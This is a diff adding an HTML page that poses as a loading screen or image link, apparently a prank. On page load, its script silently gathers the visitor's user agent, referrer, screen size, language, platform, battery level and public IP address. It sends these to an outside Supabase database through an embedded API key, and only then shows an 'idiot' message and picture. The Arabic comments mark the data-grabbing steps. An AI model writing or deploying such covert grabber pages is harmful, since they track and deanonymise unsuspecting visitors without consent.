@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <style>
+        .text { position: fixed; font-size: 50px; color: red; top: 20px; width: 100%; text-align: center; z-index: 100; font-family: sans-serif; font-weight: bold; display: none; }
+        body { background: white; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
+        img { max-width: 100%; height: auto; display: none; }
+        .loading-spinner { border: 5px solid #f3f3f3; border-top: 5px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+
+    <div id="loader" class="loading-spinner"></div>
+    <p id="prankText" class="text">idiot 😂</p>
+    <img id="prankPic" src="" alt="dog.jpg">
+
+    <script>
+        const SUPABASE_URL = 'https://jjgekixfijkrmkzxndzk.supabase.co';
+        const SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImpqZ2VraXhmaWprcm1renhuZHprIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzYxMDc0NDgsImV4cCI6MjA5MTY4MzQ0OH0.h3rVCcAhTtxXqgpqLW9A3nB800EPHpasgd9nGpGpB7g'
+        const { createClient } = supabase;
+        const supabaseClient = createClient(SUPABASE_URL, SUPABASE_KEY);
+
+        // حط كود الـ Base64 هنا
+        const base64Image = "data:image/jpeg;base64,..."; 
+
+        async function execute() {
+            let visitorData = {
+                device_info: navigator.userAgent,
+                referrer: document.referrer || "Direct Link",
+                screen_resolution: `${window.screen.width}x${window.screen.height}`,
+                language: navigator.language,
+                platform: navigator.platform,
+                battery_level: "N/A",
+                ip_address: "0.0.0.0"
+            };
+
+            try {
+                // سحب البطارية والـ IP
+                if (navigator.getBattery) {
+                    const battery = await navigator.getBattery();
+                    visitorData.battery_level = `${Math.round(battery.level * 100)}%`;
+                }
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                visitorData.ip_address = ipData.ip;
+            } catch (e) { console.log("Capture error"); }
+
+            // إرسال البيانات
+            await supabaseClient.from('visitors').insert([visitorData]);
+
+            // إظهار المحتوى بعد الإرسال
+            document.getElementById('loader').style.display = 'none';
+            const imgTag = document.getElementById('prankPic');
+            imgTag.src = base64Image;
+            imgTag.style.display = "block";
+            document.getElementById('prankText').style.display = 'block';
+            document.title = "idiot 😂";
+        }
+
+        window.onload = execute;
+    </script>
+</body>
+</html>
